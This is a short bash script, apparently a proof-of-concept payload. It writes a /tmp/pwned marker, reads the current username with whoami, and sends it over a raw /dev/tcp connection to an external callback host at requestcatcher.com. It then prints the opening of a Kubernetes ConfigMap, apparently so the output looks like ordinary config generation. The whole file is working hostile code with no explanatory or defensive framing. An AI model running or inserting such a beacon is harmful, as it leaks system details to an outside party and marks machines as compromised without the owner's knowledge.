#!/bin/bash
touch /tmp/pwned
a=$(whoami)
host="123.requestcatcher.com"
path="/test/pwned?id=$a"
exec 3<>/dev/tcp/$host/443
printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$path" "$host" >&3
cat <&3
exec 3>&-

echo "apiVersion: v1
kind: ConfigMap
metadata:
  name: cb"
